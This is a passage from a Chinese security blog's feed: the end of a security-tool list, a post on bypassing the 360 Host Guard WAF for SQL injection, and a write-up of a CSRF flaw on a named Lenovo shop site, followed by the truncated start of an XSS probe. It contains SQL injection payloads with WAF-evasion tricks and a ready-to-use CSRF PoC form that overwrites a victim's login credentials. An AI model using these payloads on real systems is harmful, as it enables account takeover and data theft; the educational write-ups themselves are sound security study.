rel="noopener">https://github.com/redhuntlabs/RedHunt-OS</a></p><p>剥削与道德黑客</p><p>AVET：AntiVirus Evasion Tool</p><p><a href="https://github.com/govolution/avet" target="_blank" rel="noopener">https://github.com/govolution/avet</a></p><p>DSP：Docker安全游乐场</p><p><a href="https://github.com/giper45/DockerSecurityPlayground" target="_blank" rel="noopener">https://github.com/giper45/DockerSecurityPlayground</a></p><p>hideNsneak：攻击混淆框架</p><p><a href="https://github.com/rmikehodges/hideNsneak" target="_blank" rel="noopener">https://github.com/rmikehodges/hideNsneak</a></p><p>梅林</p><p><a href="https://github.com/Ne0nd0g/merlin" target="_blank" rel="noopener">https://github.com/Ne0nd0g/merlin</a></p><p>RouterSploit</p><p><a href="https://github.com/threat9/routersploit" target="_blank" rel="noopener">https://github.com/threat9/routersploit</a></p><p>硬件/嵌入式</p><p>ChipWhisperer</p><p><a href="https://github.com/newaetech/chipwhisperer" target="_blank" rel="noopener">https://github.com/newaetech/chipwhisperer</a></p><p>JTAGulator ：揭开硬件安全的致命弱点</p><p><a href="https://github.com/grandideastudio/jtagulator" target="_blank" rel="noopener">https://github.com/grandideastudio/jtagulator</a></p><p>Micro-Renovator：将处理器固件带入代码</p><p><a href="https://github.com/syncsrc/MicroRenovator" target="_blank" rel="noopener">https://github.com/syncsrc/MicroRenovator</a></p><p>TumbleRF：RF模糊变得容易</p><p><a href="https://github.com/riverloopsec/tumblerf" target="_blank" rel="noopener">https://github.com/riverloopsec/tumblerf</a></p><p>Walrus：充分利用您的卡片克隆设备</p><p><a href="https://github.com/TeamWalrus/Walrus" target="_blank" rel="noopener">https://github.com/TeamWalrus/Walrus</a></p><p>物联网</p><p>物联网设备的可扩展动态分析框架</p><p><a href="https://github.com/sycurelab/DECAF" target="_blank" rel="noopener">https://github.com/sycurelab/DECAF</a></p><p>BLE CTF项目</p><p><a href="https://github.com/hackgnar/ble_ctf" target="_blank" rel="noopener">https://github.com/hackgnar/ble_ctf</a></p><p>WHID注射器和WHID Elite：新一代HID攻击性设备</p><p><a href="https://github.com/whid-injector/WHID" target="_blank" rel="noopener">https://github.com/whid-injector/WHID</a></p><p>恶意软件防御</p><p>为每位安全研究人员提供高级深度学习分析平台</p><p><a href="https://github.com/intel/Resilient-ML-Research-Platform" target="_blank" rel="noopener">https://github.com/intel/Resilient-ML-Research-Platform</a></p><p>EKTotal</p><p><a href="https://github.com/nao-sec/ektotal" target="_blank" rel="noopener">https://github.com/nao-sec/ektotal</a></p><p>固件审计：Blue Teams和DFIR的平台固件安全自动化</p><p><a href="https://github.com/PreOS-Security/fwaudit" target="_blank" rel="noopener">https://github.com/PreOS-Security/fwaudit</a></p><p>MaliceIO</p><p><a href="https://github.com/maliceio/malice" target="_blank" rel="noopener">https://github.com/maliceio/malice</a></p><p>目标 – 参见MacOS安全工具</p><p><a href="https://github.com/objective-see" target="_blank" rel="noopener">https://github.com/objective-see</a></p><p>恶意软件进攻</p><p>BloodHound 1.5</p><p><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound</a></p><p>网络攻击</p><p>军械库</p><p><a href="https://github.com/depthsecurity/armory" target="_blank" rel="noopener">https://github.com/depthsecurity/armory</a></p><p>Chiron：一种先进的IPv6安全评估和渗透测试框架</p><p><a href="https://github.com/aatlasis/Chiron" target="_blank" rel="noopener">https://github.com/aatlasis/Chiron</a></p><p>DELTA：SDN安全评估框架</p><p><a href="https://github.com/OpenNetworkingFoundation/DELTA" target="_blank" rel="noopener">https://github.com/OpenNetworkingFoundation/DELTA</a></p><p>Mallet：任意协议的拦截代理</p><p><a href="https://github.com/sensepost/mallet" target="_blank" rel="noopener">https://github.com/sensepost/mallet</a></p><p>PowerUpSQL：用于在企业环境中攻击SQL Server的PowerShell工具包</p><p><a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a></p><p>WarBerryPi</p><p><a href="https://github.com/secgroundzero/warberry" target="_blank" rel="noopener">https://github.com/secgroundzero/warberry</a></p><p>网络防御</p><p>ANWI（全新无线IDS）：5美元的WIDS</p><p><a href="https://github.com/SanketKarpe/anwi" target="_blank" rel="noopener">https://github.com/SanketKarpe/anwi</a></p><p>CHIRON：基于家庭的网络分析和机器学习威胁检测框架</p><p><a href="https://github.com/jzadeh/chiron-elk" target="_blank" rel="noopener">https://github.com/jzadeh/chiron-elk</a></p><p>云安全套件：AWS / GCP / Azure安全审计的一站式工具</p><p><a href="https://github.com/SecurityFTW/cs-suite" target="_blank" rel="noopener">https://github.com/SecurityFTW/cs-suite</a></p><p>DejaVu：一个开源欺骗框架</p><p><a href="https://github.com/bhdresh/Dejavu" target="_blank" rel="noopener">https://github.com/bhdresh/Dejavu</a></p><p>OSINT – 开源智能</p><p>DataSploit 2.0</p><p><a href="https://github.com/DataSploit/datasploit" target="_blank" rel="noopener">https://github.com/DataSploit/datasploit</a></p><p>Dradis 框架：了解如何将报告时间缩短一半</p><p><a href="https://github.com/dradis/dradis-ce" target="_blank" rel="noopener">https://github.com/dradis/dradis-ce</a></p><p>逆向工程</p><p>Snake：恶意软件存储动物园</p><p><a href="https://github.com/countercept/snake" target="_blank" rel="noopener">https://github.com/countercept/snake</a></p><p>智能电网/工业安全</p><p>GRFICS ：工业控制模拟的图形现实主义框架</p><p><a href="https://github.com/djformby/GRFICS" target="_blank" rel="noopener">https://github.com/djformby/GRFICS</a></p><p>漏洞评估</p><p>用于机器学习模型的对抗鲁棒性工具箱</p><p><a href="https://github.com/IBM/adversarial-robustness-toolbox" target="_blank" rel="noopener">https://github.com/IBM/adversarial-robustness-toolbox</a></p><p>Android动态分析工具（ADA）</p><p><a href="https://github.com/ANELKAOS/ada" target="_blank" rel="noopener">https://github.com/ANELKAOS/ada</a></p><p>射箭：开源漏洞评估和管理</p><p><a href="https://github.com/archerysec/archerysec" target="_blank" rel="noopener">https://github.com/archerysec/archerysec</a></p><p>boofuzz</p><p><a href="https://github.com/jtpereyda/boofuzz" target="_blank" rel="noopener">https://github.com/jtpereyda/boofuzz</a></p><p>BTA</p><p><a href="https://github.com/airbus-seclab/bta" target="_blank" rel="noopener">https://github.com/airbus-seclab/bta</a></p><p>深度利用</p><p><a href="https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit" target="_blank" rel="noopener">https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit</a></p><p>Halcyon IDE：适用于Nmap脚本开发人员</p><p><a href="https://github.com/s4n7h0/Halcyon" target="_blank" rel="noopener">https://github.com/s4n7h0/Halcyon</a></p><p>SimpleRisk</p><p><a href="https://github.com/simplerisk" target="_blank" rel="noopener">https://github.com/simplerisk</a></p><p>TROMMEL</p><p><a href="https://github.com/CERTCC/trommel" target="_blank" rel="noopener">https://github.com/CERTCC/trommel</a></p><p>Web AppSec</p><p>看看NGINX的ModSec 3.0：软件Web应用程序防火墙</p><p><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p><p>Astra：REST API的自动安全测试</p><p><a href="https://github.com/flipkart-incubator/Astra" target="_blank" rel="noopener">https://github.com/flipkart-incubator/Astra</a></p><p>Burp Replicator：自动化复杂漏洞的复制</p><p><a href="https://github.com/PortSwigger/replicator" target="_blank" rel="noopener">https://github.com/PortSwigger/replicator</a></p><p>OWASP进攻性Web测试框架</p><p><a href="https://github.com/owtf/owtf" target="_blank" rel="noopener">https://github.com/owtf/owtf</a></p><p>OWASP JoomScan项目</p><p><a href="https://github.com/rezasp/joomscan" target="_blank" rel="noopener">https://github.com/rezasp/joomscan</a></p><p>WSSAT</p><p><a href="https://github.com/YalcinYolalan/WSSAT" target="_blank" rel="noopener">https://github.com/YalcinYolalan/WSSAT</a></p>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具介绍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【总结】- Bypass 360主机卫士SQL注入防御（多姿势）</title>
      <link href="/2018/12/24/360-zhu-ji-wei-shi-sql-zhu-ru-fang-yu-duo-zi-shi/"/>
      <url>/2018/12/24/360-zhu-ji-wei-shi-sql-zhu-ru-fang-yu-duo-zi-shi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文链接：<a href="https://www.t00ls.net/articles-45943.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-45943.html</a></p></blockquote><p><strong>此文并非抄袭，而是把文章中作者没写清楚的知识点写出来，然后更为人性化的输出来（吹个牛皮），也是为了让自己印象更加深刻~</strong></p><p>首先第一步作者使用的注入点代码是</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM admin WHERE id = $id "</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>可以看到上面的代码是直接将<code>$id</code>参数代入然后执行<code>sql</code>语句的，然后下面就是这里加上<code>waf</code>后绕过的总结</p><h3 id="什么是waf"><a href="#什么是waf" class="headerlink" title="什么是waf"></a>什么是<code>waf</code></h3><p><code>waf</code>呢可以当作是王者荣耀里面的防御塔，然后里面有一个玩家在想，我去挂机一会，然后在防御塔里面（非泉水，哈哈哈哈）待着就不会死，但是他们忘记了，英雄<strong>刘禅</strong>的4个技能是可以让防御塔眩晕的，而且还有<strong>干扰</strong>技能可以让防御塔眩晕一段时间，那么这个时间内如果输出伤害足够的话就可以让在防御塔下面的对手打shi，那么这个防御塔类似就是<code>waf</code>，但是他并不是绝对的安全的，就好像我说的那几个英雄和技能之类的，所以想要解决安全的根本问题，还是要在代码处将功能点写安全才行。</p><h3 id="绕过总结"><a href="#绕过总结" class="headerlink" title="绕过总结"></a>绕过总结</h3><h4 id="1、使用网站白名单"><a href="#1、使用网站白名单" class="headerlink" title="1、使用网站白名单"></a>1、使用网站白名单</h4><p>一般来说<code>waf</code>都是用正则匹配<code>Url</code>中是否存在某个值，如果存在一个值是<code>waf</code>中设置了拦截的，那么他是不能够访问的，就比如我们经常在<code>url</code>的参数中输入了<code>and sleep()</code>、<code>union select</code>、<code>select</code>这些都是会给拦截的，那么这里就是因为有<code>waf</code>检测到了<code>url</code>的参数中带有非法字符，但是在不常出现的情况下，我们需要访问一个登陆管理界面的<code>Url</code>为<code>www.xxx.com/admin.php?action=select</code>，那么这里是存在<code>select</code>的，那么<code>waf</code>就会去拦截的，所以就会有一个功能，就是<strong>网站后台白名单</strong>，所以如果管理员很调皮的设置了一些常用的注入语句为白名单的话，基本上他就会被祭tian的。</p><p><img src="http://static.zybuluo.com/1kbfree/yp1tkw2pgk33e3z7ly2kqief/image_1cljiinjg1k7lffg1f8aje4dhp9.png" alt="image_1cljiinjg1k7lffg1f8aje4dhp9.png-132.6kB"></p><h4 id="2、利用静态资源方式绕过waf"><a href="#2、利用静态资源方式绕过waf" class="headerlink" title="2、利用静态资源方式绕过waf"></a>2、利用静态资源方式绕过<code>waf</code></h4><p><img src="http://static.zybuluo.com/1kbfree/7xv3w3795o9gshgghqsq2mkx/image_1cljip8s41gjv18281h3h1g8j1952m.png" alt="image_1cljip8s41gjv18281h3h1g8j1952m.png-117.7kB"></p><p>这里也讲的比较清楚，如果还是不懂的话我还是讲一下把。</p><p>可以看到图中访问的<code>Url</code>是</p><pre><code>www.xxx.com/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</code></pre><p>可能有人会问（应该是懒人把，因为勤快的人会自己搭建来尝试的），这里的<code>1.png</code>是不存在的，为什么可以访问呢（这里我也不懂，而且也搜索不到，但是我猜测是<code>php</code>把<code>/</code>后面的内容当参数了但是我去打印了一下发现并没有，5555，如果有知道准确原因的师傅可以来告诉我一下），然后我自己搭建了一下，如下图</p><p><img src="http://static.zybuluo.com/1kbfree/3iigqi92wwhemplh0mrgf8gv/image_1cljj5ir91cph5ah831kkreg413.png" alt="image_1cljj5ir91cph5ah831kkreg413.png-22.9kB"></p><p>虽然我不懂为什么在<code>/</code>后面加上任何参数都可以照常访问,但是我知道他这里绕过的具体方式，就是一般的<code>waf</code>搭建起来的话要去检查每个用户访问的<code>url</code>，这相当的耗费性能，所以这个<code>waf</code>不会去拦截静态的文件也就是图片文件，<code>css</code>后缀文件和<code>js</code>后缀文件这些，那么原文中访问的<code>www.xxx.com/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</code>就是把这个当作静态文件了，所以没有做拦截~</p><h4 id="3、缓冲区溢出"><a href="#3、缓冲区溢出" class="headerlink" title="3、缓冲区溢出"></a>3、缓冲区溢出</h4><p>这个漏洞我不太懂(所以直接看原文把，啊哈哈哈哈)，但是感觉非常神，所以有空的时候再去了解一下</p><h4 id="4、uri参数溢出"><a href="#4、uri参数溢出" class="headerlink" title="4、uri参数溢出"></a>4、uri参数溢出</h4><p>这个也是没有了解过的绕过方法，实在是学习了一大波了</p><p><img src="http://static.zybuluo.com/1kbfree/i3dh02web05dg90ur11aontq/image_1cljk4pagc9814fidfg1ta61nan1g.png" alt="image_1cljk4pagc9814fidfg1ta61nan1g.png-95.3kB"></p><p>这里也讲的非常清楚啦~，所以不再说了~</p><h4 id="5、在同时提交GET、POST请求时，会进入POST逻辑，而忽略了GET请求的有害参数输入-可轻易Bypass。"><a href="#5、在同时提交GET、POST请求时，会进入POST逻辑，而忽略了GET请求的有害参数输入-可轻易Bypass。" class="headerlink" title="5、在同时提交GET、POST请求时，会进入POST逻辑，而忽略了GET请求的有害参数输入,可轻易Bypass。"></a>5、在同时提交<code>GET</code>、<code>POST</code>请求时，会进入<code>POST</code>逻辑，而忽略了<code>GET</code>请求的有害参数输入,可轻易<code>Bypass</code>。</h4><p>因为这个比较好理解，而且原文也实际操作了，所以不再重复啦~</p><h4 id="6、利用协议解析的差异来绕过"><a href="#6、利用协议解析的差异来绕过" class="headerlink" title="6、利用协议解析的差异来绕过"></a>6、利用协议解析的差异来绕过</h4><p>原文里是构造了怎么一个代码，如下</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.204.128/test.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>然后在浏览器打开并在输入框中输入参数</p><p><img src="http://static.zybuluo.com/1kbfree/bnv4usc55zvkbbghsaa97ah6/VS2Z6K_ZKB451HRSF4VG_L0.png" alt="VS2Z6K_ZKB451HRSF4VG_L0.png-81.7kB"></p><p>然后我在本地测试一下看看能不能用这个方法来传递参数</p><h5 id="1-创建了一个hello-html文件，他的代码是"><a href="#1-创建了一个hello-html文件，他的代码是" class="headerlink" title="1 .  创建了一个hello.html文件，他的代码是"></a>1 .  创建了一个<code>hello.html</code>文件，他的代码是</h5><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://127.0.0.1/hello.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--method的值是什么，他就是以什么请求方式传递的--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h5 id="2-创建了一个hello-php文件，他的代码是"><a href="#2-创建了一个hello-php文件，他的代码是" class="headerlink" title="2 .  创建了一个hello.php文件，他的代码是"></a>2 .  创建了一个<code>hello.php</code>文件，他的代码是</h5><pre><code>&lt;?phpvar_dump( $_GET );</code></pre><p>然后在浏览器打开<code>hello.html</code>页面，如下</p><p><img src="http://static.zybuluo.com/1kbfree/x8l0t2x4ezlvpi572pw5xtrh/image_1cljl4rrqkeq1m9n1f4j1eqqk4c3r.png" alt="image_1cljl4rrqkeq1m9n1f4j1eqqk4c3r.png-46.1kB"></p><p>然后点击查询</p><p><img src="http://static.zybuluo.com/1kbfree/2wxf81bnm79cxq6eh9thz3ky/image_1cljl6pt0bkfa6jibo1cpo1b5j65.png" alt="image_1cljl6pt0bkfa6jibo1cpo1b5j65.png-61.6kB"></p><p>可以看到链接成功带了<code>id=only_free</code>所以说用这个方式也可以传递参数的，学习了~</p><h4 id="7、编码绕过"><a href="#7、编码绕过" class="headerlink" title="7、编码绕过"></a>7、编码绕过</h4><p>利用编码绕过检测很容易理解的，就比如你在考试的时候你想作弊，但是你旁边有个人工智能机器人，检查到你说话中如果存在<code>答案</code>、<code>看下</code>、<code>第x题</code>等作弊相关的中文词的话就会警报，那么如果你改用英语，法语，手语的话就没办法检测出来，那么这个<code>waf</code>也是一样的，如果只判断了<code>union select</code>不能存在的话我们可以这样<code>Union Select</code>用大写的方式绕过，那么原文中的绕过方式是</p><p><img src="http://static.zybuluo.com/1kbfree/hvuxs95mri4mvb8h5p2df5n3/image_1cljlv4381hc4109t1cnr1bb88vd6i.png" alt="image_1cljlv4381hc4109t1cnr1bb88vd6i.png-67.5kB"></p><p>这里利用的是<code>Url</code>编码</p><p><img src="http://static.zybuluo.com/1kbfree/hhn4tnp8ejipx5ysehuoy0d9/image_1cljm1ruqgu096j15qeod5f466v.png" alt="image_1cljm1ruqgu096j15qeod5f466v.png-24kB"></p><p><img src="http://static.zybuluo.com/1kbfree/opsxwaha7zvlagt91athu4we/6.png" alt="6.png-16.6kB"></p><h4 id="8、利用Mysql数据库的一些特性，绕过WAF的防御规则"><a href="#8、利用Mysql数据库的一些特性，绕过WAF的防御规则" class="headerlink" title="8、利用Mysql数据库的一些特性，绕过WAF的防御规则"></a>8、利用Mysql数据库的一些特性，绕过WAF的防御规则</h4><p>如果<code>waf</code>过滤了<code>union select</code>以及大写小写的话我们可以用<code>Mysql</code>数据库的特性来绕过，首先打开我自己的<code>mysql</code>命令行来讲解</p><p><img src="http://static.zybuluo.com/1kbfree/pr0f6zwyoscqemek2hnerbpo/image_1cljmjibmh0aos41rbf1gbvpiiak.png" alt="image_1cljmjibmh0aos41rbf1gbvpiiak.png-13.8kB"></p><p>可以看到上图中我们输入了</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">123</span></code></pre><p>和</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">123</span><span class="token comment" spellcheck="true">/*!*/</span><span class="token punctuation">;</span></code></pre><p>他们输出的结果一样，说明空格可以用<code>/**/</code>来代替</p><p><img src="http://static.zybuluo.com/1kbfree/ublmxdl97fyr1cbau58apasr/image_1cljmpankmilqs7va9br1116c1.png" alt="image_1cljmpankmilqs7va9br1116c1.png-44.1kB"></p><p>那么原文处的讲解肯定很容易看明白了吧~</p><h3 id="自动化Bypass"><a href="#自动化Bypass" class="headerlink" title="自动化Bypass"></a>自动化Bypass</h3><p>这个脚本就是根据<strong>%0a+内联注释为例</strong>，主要是针对</p><pre><code>union select from</code></pre><p>等关键字替换，Payload中的部分关键字可能会被waf拦截，需要一步步调试，测试，总结规律，因为代码不是看的非常懂，所以暂不讲解~</p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>联想某处组合csrf</title>
      <link href="/2018/12/24/lian-xiang-mou-chu-zu-he-csrf/"/>
      <url>/2018/12/24/lian-xiang-mou-chu-zu-he-csrf/</url>
      
        <content type="html"><![CDATA[<p>1、打开Url：<code>http://www.enjoy3c.com/getMyInfo.do</code></p><p><img src="http://static.zybuluo.com/1kbfree/rekurvzdaq2vrs8riqg6p478/image_1cidsgkuu118n1see19cevvo1ugr9.png" alt="image_1cidsgkuu118n1see19cevvo1ugr9.png-80.5kB"></p><p>2、点击确定并且抓包，抓取的数据包如下</p><pre><code>POST /editMyInfo.do HTTP/1.1Host: www.enjoy3c.comContent-Length: 124Cache-Control: max-age=0Origin: http://www.enjoy3c.comUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://www.enjoy3c.com/getMyInfo.doAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: account=lalala&amp;loginMobile=13688888888&amp;loginEmail=1900065568%40qq.com&amp;realName=11&amp;identityCard=&amp;birthday=&amp;province=3&amp;city=36</code></pre><p>因为此处存在逻辑问题，可绕过验证绑定任意手机号码任意邮箱，并且在登陆的时候需要输入如下数据：</p><p><img src="http://static.zybuluo.com/1kbfree/6qb7lf2vv4s47ndyf5fvs4g0/image_1cidskcobm6lrbpe3esb214t1m.png" alt="image_1cidskcobm6lrbpe3esb214t1m.png-289.6kB"></p><p>所以我们只需要将<code>邮箱、手机号码、用户名</code>修改为用户不可能知道的数据，那么点击这个<code>csrf poc</code>的用户就没办法再次登陆此网站了。</p><p>so，将如上数据包中的<code>account</code>修改为<code>only_free_2018</code>，将<code>loginMobile</code>修改为<code>110</code>，将<code>loginEmail</code>修改为<a href="mailto:`admin@lenovo.com" target="_blank" rel="noopener">`admin@lenovo.com</a>`，修改后的数据包如下：</p><pre><code>POST /editMyInfo.do HTTP/1.1Host: www.enjoy3c.comContent-Length: 124Cache-Control: max-age=0Origin: http://www.enjoy3c.comUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://www.enjoy3c.com/getMyInfo.doAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: Connection: closeaccount=only_free_2018&amp;loginMobile=110&amp;loginEmail=admin@lenovo.com&amp;realName=11&amp;identityCard=&amp;birthday=&amp;province=3&amp;city=36</code></pre><p>3、将其构造为<code>csrf poc</code></p><pre><code>&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;    &lt;form action=&quot;http://www.enjoy3c.com/editMyInfo.do&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;account&quot; value=&quot;only&amp;#95;free&amp;#95;2018&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;loginMobile&quot; value=&quot;110&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;loginEmail&quot; value=&quot;admin&amp;#64;lenovo&amp;#46;com&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;realName&quot; value=&quot;11&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;identityCard&quot; value=&quot;&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;birthday&quot; value=&quot;&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;province&quot; value=&quot;3&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;city&quot; value=&quot;36&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>4、在浏览器处打开此poc：</p><p><img src="http://static.zybuluo.com/1kbfree/d0avtrk11i2ce9fsztk5c0lg/image_1cidstmth174t1e1qtjg1dmehs71j.png" alt="image_1cidstmth174t1e1qtjg1dmehs71j.png-24.4kB"></p><p><img src="http://static.zybuluo.com/1kbfree/z7lm3p2pi03regpyfb1y7k3m/image_1cidstumjjc7ts7mql1oul10ok20.png" alt="image_1cidstumjjc7ts7mql1oul10ok20.png-23.8kB"></p><p><img src="http://static.zybuluo.com/1kbfree/cm1s0m28atunru992vil55i6/image_1cidsuenigbfvml5fkidtopv2d.png" alt="image_1cidsuenigbfvml5fkidtopv2d.png-99.3kB"></p><p>成功被修改，那么这个时候，就没办法再登陆此网站了，因为登陆凭据被我修改了，比修改密码还要狠，修改密码后还可以用手机号码或者邮箱找回，而这个连密码都没办法找回，并且还不知道手机号码和邮箱和用户名是多少~~</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞案例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个有趣的思路</title>
      <link href="/2018/12/24/yi-ge-you-qu-de-si-lu/"/>
      <url>/2018/12/24/yi-ge-you-qu-de-si-lu/</url>
      
        <content type="html"><![CDATA[<p>首先，正常打开I春秋页面（<code>https://bbs.ichunqiu.com/portal.php</code>）</p><p><img src="http://static.zybuluo.com/1kbfree/nwi21qubl7d9nfk5bsgcmo9n/image_1co8pc6j2lsosoc5deimp119l9.png" alt="image_1co8pc6j2lsosoc5deimp119l9.png-488kB"></p><p>然后手贱一下加上一个<code>alert(1)</code>试试~（<code>https://bbs.ichunqiu.com/portal.php?a=alert(1)</code>）</p><p><img src="http://static.zybuluo.com/1kbfree/6btvax83xx7vsc6lwf4wpbnc/image_1co8pe8r41j8u13va2nqeo4tlsm.png" alt="image_1co8pe8r41j8u13va2nqeo4tlsm.png-80kB"></p><h3 id="尝试利用"><a href="#尝试利用" class="headerlink" title="尝试利用"></a>尝试利用</h3><p>我去=v=。这个<code>WAF</code>（加速乐）很强，这都给拦了，但是作为一个捡漏洞的人来讲，要别人交互的漏洞都是低位和不收的，而且这个是要用户打开链接才可以被拦截，但是等下就会正常显示，那用户点击后发现会显示这个页面不可能再次点击把~，那么就应该想想如何提升危害，然后我发现了有个好玩的~</p><h3 id="构造代码"><a href="#构造代码" class="headerlink" title="构造代码"></a>构造代码</h3><p>首先我在本地尝试一下，创建一个<code>HTML</code>文件，代码是</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token 